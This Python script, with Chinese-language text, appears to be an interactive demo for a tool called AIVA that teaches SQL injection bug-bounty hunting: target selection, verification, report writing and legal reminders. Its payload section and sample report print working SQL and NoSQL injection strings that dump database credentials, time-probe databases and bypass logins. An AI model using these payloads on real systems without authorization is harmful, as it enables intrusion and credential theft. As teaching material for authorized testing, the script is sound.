#!/usr/bin/env python3
"""
AIVA SQL Injection Bounty Hunter Demo - Task 12+
演示專業獎金獵人的 SQL 注入工具
"""

import asyncio
import sys
from pathlib import Path
from typing import Dict, Any

# 添加項目根目錄到 Python 路徑
project_root = Path(__file__).resolve().parent.parent.parent.parent
sys.path.insert(0, str(project_root))

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()


async def demo_bounty_hunter_mindset():
    """演示獎金獵人思維模式"""
    console.print("\n[bold blue]🎯 獎金獵人思維模式[/bold blue]")
    
    console.print("[yellow]專業獎金獵手 vs 腳本小子的區別:[/yellow]")
    
    comparison_table = Table(title="Professional vs Script Kiddie")
    comparison_table.add_column("腳本小子", style="red")
    comparison_table.add_column("專業獎金獵手", style="green")
    
    comparisons = [
        ("掃描所有目標", "精選高價值目標"),
        ("使用通用載荷", "定制化高置信度載荷"),
        ("忽略誤報", "嚴格驗證每個發現"),
        ("關注數量", "關注質量和影響"),
        ("無差別攻擊", "針對性滲透測試"),
        ("缺乏文檔", "詳細的 PoC 和影響分析"),
        ("自動化一切", "手動驗證關鍵發現"),
        ("忽略業務邏輯", "深入理解業務影響")
    ]
    
    for script_kiddie, professional in comparisons:
        comparison_table.add_row(script_kiddie, professional)
    
    console.print(comparison_table)
    
    console.print("\n[green]✅ 獎金獵人成功要素:[/green]")
    success_factors = [
        "🎯 目標選擇: 專注於有獎金計劃的高價值目標",
        "🔍 深度分析: 不只是表面掃描，要理解應用邏輯",
        "⚡ 高效率: 快速識別和排除誤報",
        "📝 專業報告: 清晰的 PoC 和業務影響說明",
        "🛡️ 負責任披露: 遵循負責任的漏洞披露流程",
        "📚 持續學習: 跟上最新的攻擊技術和防護繞過"
    ]
    
    for factor in success_factors:
        console.print(f"  {factor}")


async def demo_high_value_targets():
    """演示高價值目標識別"""
    console.print("\n[bold blue]🎯 高價值目標識別[/bold blue]")
    
    console.print("[yellow]高價值目標特徵:[/yellow]")
    
    target_types = [
        ("🏦 金融服務", "$5000-$50000", "銀行、支付、投資平台"),
        ("🛒 電商平台", "$1000-$15000", "在線商店、市場平台"),
        ("☁️ 雲服務", "$2000-$25000", "AWS、Azure、GCP 相關服務"),
        ("💼 企業 SaaS", "$1500-$20000", "CRM、ERP、HR 系統"),
        ("🎮 遊戲平台", "$500-$8000", "在線遊戲、虛擬貨幣"),
        ("📱 社交媒體", "$1000-$12000", "社交網絡、通訊應用"),
        ("🏥 醫療系統", "$2000-$30000", "電子病歷、醫療設備"),
        ("🚗 IoT 設備", "$500-$10000", "智能汽車、工業控制")
    ]
    
    target_table = Table(title="高價值目標類型")
    target_table.add_column("類型", style="cyan")
    target_table.add_column("獎金範圍", style="green")
    target_table.add_column("描述", style="yellow")
    
    for target_type, bounty_range, description in target_types:
        target_table.add_row(target_type, bounty_range, description)
    
    console.print(target_table)
    
    console.print("\n[yellow]目標評估標準:[/yellow]")
    criteria = [
        "💰 獎金計劃: 公開的漏洞獎勵計劃",
        "📊 業務規模: 大型企業或高用戶量平台", 
        "🔐 數據敏感性: 處理個人、財務或機密數據",
        "🌐 網絡暴露: 面向公網的 Web 應用",
        "⚡ 響應速度: 活躍的安全團隊和快速響應",
        "📜 合法性: 明確的測試授權和法律保護"
    ]
    
    for criterion in criteria:
        console.print(f"  {criterion}")


async def demo_advanced_payloads():
    """演示高級載荷策略"""
    console.print("\n[bold blue]⚡ 高級載荷策略[/bold blue]")
    
    console.print("[yellow]Critical 級別載荷示例:[/yellow]")
    
    payload_categories = [
        {
            "name": "🔥 Critical Error-based",
            "description": "直接暴露數據庫信息",
            "examples": [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' UNION SELECT NULL,NULL,CONCAT(@@hostname,':',@@version,':',user())--"
            ],
            "impact": "立即暴露數據庫版本、主機名、用戶信息"
        },
        {
            "name": "💎 Advanced Union-based", 
            "description": "數據洩露和系統信息提取",
            "examples": [
                "' UNION SELECT NULL,NULL,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
                "' UNION SELECT username,password,email,NULL FROM users--"
            ],
            "impact": "直接提取敏感數據，如用戶憑據"
        },
        {
            "name": "⏱️ Precision Time-blind",
            "description": "高精度時間盲注檢測",
            "examples": [
                "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND SLEEP(10))--",
                "' OR (SELECT * FROM (SELECT(SLEEP(10-(IF(MID(version(),1,1) LIKE 5, 0, 10)))))a)--"
            ],
            "impact": "繞過 WAF 的條件時間延遲檢測"
        },
        {
            "name": "🎭 NoSQL Bypass",
            "description": "NoSQL 數據庫認證繞過",
            "examples": [
                '{"username": {"$ne": null}, "password": {"$ne": null}}',
                '{"$where": "this.username == \'admin\' && this.password.length > 0"}'
            ],
            "impact": "繞過身份驗證，直接訪問管理員賬戶"
        }
    ]
    
    for category in payload_categories:
        console.print(f"\n[bold cyan]{category['name']}[/bold cyan]")
        console.print(f"[dim]{category['description']}[/dim]")
        console.print(f"[red]影響: {category['impact']}[/red]")
        
        for i, example in enumerate(category['examples'], 1):
            console.print(f"  {i}. [yellow]{example}[/yellow]")


async def demo_vulnerability_verification():
    """演示漏洞驗證流程"""
    console.print("\n[bold blue]✅ 漏洞驗證流程[/bold blue]")
    
    verification_steps = [
        {
            "step": "1️⃣ 初始檢測",
            "description": "使用高置信度載荷進行初始檢測",
            "criteria": "響應異常、錯誤消息、時間延遲"
        },
        {
            "step": "2️⃣ 誤報過濾", 
            "description": "排除常見的誤報情況",
            "criteria": "404錯誤、WAF響應、通用錯誤頁面"
        },
        {
            "step": "3️⃣ 雙重驗證",
            "description": "使用不同載荷再次驗證",
            "criteria": "一致的異常響應、可重現的行為"
        },
        {
            "step": "4️⃣ 手動確認",
            "description": "人工分析響應內容",
            "criteria": "數據庫特征、敏感信息洩露"
        },
        {
            "step": "5️⃣ 影響評估",
            "description": "評估漏洞的業務影響",
            "criteria": "數據訪問權限、系統控制能力"
        }
    ]
    
    verification_table = Table(title="漏洞驗證流程")
    verification_table.add_column("步驟", style="cyan")
    verification_table.add_column("描述", style="yellow") 
    verification_table.add_column("判斷標準", style="green")
    
    for step_info in verification_steps:
        verification_table.add_row(
            step_info["step"],
            step_info["description"],
            step_info["criteria"]
        )
    
    console.print(verification_table)
    
    console.print("\n[green]高置信度指標:[/green]")
    confidence_indicators = [
        "🔍 數據庫錯誤消息 (95% 置信度)",
        "⏱️ 精確的時間延遲 (90% 置信度)", 
        "📊 數據結構洩露 (92% 置信度)",
        "🔐 認證繞過成功 (98% 置信度)",
        "💾 系統信息暴露 (95% 置信度)"
    ]
    
    for indicator in confidence_indicators:
        console.print(f"  {indicator}")


async def demo_bounty_report_generation():
    """演示獎金報告生成"""
    console.print("\n[bold blue]📋 專業獎金報告[/bold blue]")
    
    console.print("[yellow]報告必備要素:[/yellow]")
    
    report_sections = [
        "📌 Executive Summary - 高層管理摘要",
        "🎯 Vulnerability Details - 漏洞詳細信息", 
        "💥 Proof of Concept - 概念驗證步驟",
        "🔥 Business Impact - 業務影響分析",
        "⚡ Risk Assessment - 風險評估",
        "🛠️ Remediation - 修復建議",
        "📸 Screenshots - 關鍵截圖證據",
        "🔗 References - 相關參考資料"
    ]
    
    for section in report_sections:
        console.print(f"  {section}")
    
    console.print(f"\n[yellow]示例報告片段:[/yellow]")
    
    sample_report = """
[bold green]🏆 Critical SQL Injection Vulnerability[/bold green]

[cyan]Target:[/cyan] https://example-bank.com/login
[cyan]Parameter:[/cyan] username
[cyan]Severity:[/cyan] Critical (9.8/10)
[cyan]Confidence:[/cyan] 95%

[yellow]💥 Proof of Concept:[/yellow]
1. Navigate to https://example-bank.com/login
2. Inject payload: admin' UNION SELECT NULL,NULL,CONCAT(user,':',password) FROM mysql.user--
3. Observe database user credentials in response

[red]🔥 Business Impact:[/red]
- Full database access with administrative privileges
- Customer PII and payment data exposure
- Potential for complete system compromise
- Estimated financial impact: $2M+ in regulatory fines

[green]💰 Estimated Bounty Value: $25,000[/green]
"""
    
    console.print(Panel(sample_report, border_style="green"))


async def demo_bounty_success_metrics():
    """演示獎金成功指標"""
    console.print("\n[bold blue]📊 獎金獵人成功指標[/bold blue]")
    
    # 模擬獎金統計
    success_stats = {
        "總獎金收入": "$127,500",
        "平均單次獎金": "$8,500", 
        "成功提交率": "78%",
        "Critical 級別發現": "15個",
        "平均響應時間": "3.2天",
        "最高單筆獎金": "$25,000"
    }
    
    stats_table = Table(title="🏆 獎金獵人業績")
    stats_table.add_column("指標", style="cyan")
    stats_table.add_column("數值", style="green")
    
    for metric, value in success_stats.items():
        stats_table.add_row(metric, value)
    
    console.print(stats_table)
    
    console.print("\n[yellow]成功率提升策略:[/yellow]")
    improvement_strategies = [
        "🎯 專注特定領域 (如金融、醫療)",
        "🔬 深入研究目標技術棧",
        "⚡ 快速響應時間和專業溝通",
        "📚 持續學習新攻擊技術",
        "🤝 建立與安全團隊的良好關係",
        "💼 打造個人品牌和聲譽"
    ]
    
    for strategy in improvement_strategies:
        console.print(f"  {strategy}")


async def demo_live_hunting_simulation():
    """演示實時狩獵模擬"""
    console.print("\n[bold blue]🎯 實時狩獵模擬[/bold blue]")
    
    # 模擬獎金獵人工作流程
    hunting_workflow = [
        ("🔍 目標偵察", "識別高價值目標和攻擊面"),
        ("⚡ 快速掃描", "使用專業載荷進行精準檢測"),
        ("✅ 漏洞驗證", "排除誤報，確認真實漏洞"),
        ("📝 報告撰寫", "生成專業的漏洞報告"),
        ("📤 負責任披露", "提交給目標組織安全團隊"),
        ("💰 獎金收穫", "等待獎金發放和聲譽提升")
    ]
    
    console.print("[yellow]獎金獵人典型工作流程:[/yellow]")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        
        for i, (phase, description) in enumerate(hunting_workflow):
            task = progress.add_task(f"{phase}: {description}", total=1)
            
            # 模擬工作時間
            await asyncio.sleep(1.5)
            
            progress.update(task, completed=1)
            console.print(f"[green]✅ {phase} 完成[/green]")
    
    console.print("\n[bold green]🏆 狩獵成功！發現 Critical 級別漏洞！[/bold green]")
    console.print("[cyan]預估獎金: $15,000 💰[/cyan]")


async def demo_legal_and_ethical_considerations():
    """演示法律和倫理考慮"""
    console.print("\n[bold blue]⚖️ 法律和倫理考慮[/bold blue]")
    
    console.print("[red]⚠️ 重要法律提醒:[/red]")
    legal_reminders = [
        "🔒 只測試有明確授權的目標",
        "📋 仔細閱讀獎金計劃條款",
        "🚫 絕不測試範圍外的系統",
        "💾 不下載或存儲真實用戶數據", 
        "🤝 遵循負責任的漏洞披露政策",
        "📞 出現問題時立即聯繫安全團隊"
    ]
    
    for reminder in legal_reminders:
        console.print(f"  {reminder}")
    
    console.print("\n[green]✅ 最佳實踐:[/green]")
    best_practices = [
        "📝 記錄所有測試活動和時間",
        "🔐 使用專用測試環境和工具",
        "💬 保持專業和友好的溝通",
        "🎯 專注於幫助改善安全性",
        "📚 持續學習法律和行業標準",
        "🤝 與安全社區積極互動"
    ]
    
    for practice in best_practices:
        console.print(f"  {practice}")


async def run_interactive_demo():
    """運行交互式演示"""
    console.print(Panel.fit(
        "[bold blue]🎯 AIVA SQL Injection Bounty Hunter[/bold blue]\n"
        "[yellow]專業獎金獵手演示[/yellow]",
        border_style="blue"
    ))
    
    demos = [
        ("獎金獵人思維模式", demo_bounty_hunter_mindset),
        ("高價值目標識別", demo_high_value_targets),
        ("高級載荷策略", demo_advanced_payloads),
        ("漏洞驗證流程", demo_vulnerability_verification),
        ("專業報告生成", demo_bounty_report_generation),
        ("成功指標分析", demo_bounty_success_metrics),
        ("實時狩獵模擬", demo_live_hunting_simulation),
        ("法律倫理考慮", demo_legal_and_ethical_considerations)
    ]
    
    while True:
        console.print("\n[bold cyan]🎯 請選擇演示項目:[/bold cyan]")
        
        for i, (name, _) in enumerate(demos, 1):
            console.print(f"  {i}. {name}")
        
        console.print("  9. 運行所有演示")
        console.print("  0. 退出")
        
        try:
            choice = console.input("\n[yellow]請輸入選項 (0-9): [/yellow]")
            
            if choice == "0":
                console.print("[green]Happy Hunting! 🎯💰[/green]")
                break
            elif choice == "9":
                console.print("\n[bold green]運行所有演示...[/bold green]")
                for name, demo_func in demos:
                    console.print(f"\n{'='*60}")
                    console.print(f"[bold yellow]正在運行: {name}[/bold yellow]")
                    console.print('='*60)
                    await demo_func()
                    
                    console.input("\n[dim]按 Enter 繼續下一個演示...[/dim]")
                
                console.print("\n[bold green]所有演示已完成！準備開始你的獎金獵人之旅！ 🎯💰[/bold green]")
                break
            elif choice.isdigit() and 1 <= int(choice) <= len(demos):
                idx = int(choice) - 1
                name, demo_func = demos[idx]
                
                console.print(f"\n{'='*60}")
                console.print(f"[bold yellow]正在運行: {name}[/bold yellow]")
                console.print('='*60)
                
                await demo_func()
                
                console.input("\n[dim]按 Enter 返回主選單...[/dim]")
            else:
                console.print("[red]無效選項，請重新選擇[/red]")
                
        except KeyboardInterrupt:
            console.print("\n[yellow]演示已中斷[/yellow]")
            break
        except Exception as e:
            console.print(f"[red]運行演示時發生錯誤: {str(e)}[/red]")


async def main():
    """主函數"""
    try:
        await run_interactive_demo()
    except Exception as e:
        console.print(f"[red]演示程序錯誤: {str(e)}[/red]")
        return 1
    
    return 0


if __name__ == "__main__":
    # 運行演示
    exit_code = asyncio.run(main())
    sys.exit(exit_code)